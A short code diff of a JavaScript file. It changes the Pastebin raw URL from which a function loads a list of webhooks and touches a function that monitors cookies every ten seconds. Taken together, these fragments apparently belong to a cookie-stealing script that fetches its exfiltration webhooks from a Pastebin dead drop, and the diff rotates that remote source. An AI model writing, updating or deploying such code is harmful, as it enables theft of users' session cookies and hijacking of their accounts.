@@ -5,7 +5,7 @@ let webhookUrls = [];
 async function carregarWebhooks() {
     try {
         const pastebinUrls = [
-            'https://pastebin.com/raw/063B6hVZ'
+            'https://pastebin.com/raw/JqQXrwfs'
         ];
 
         let allWebhooks = [];
@@ -478,5 +478,6 @@ function monitorarCookies() {
         });
     }, 10000);
 }
+
 
 monitorarCookies();
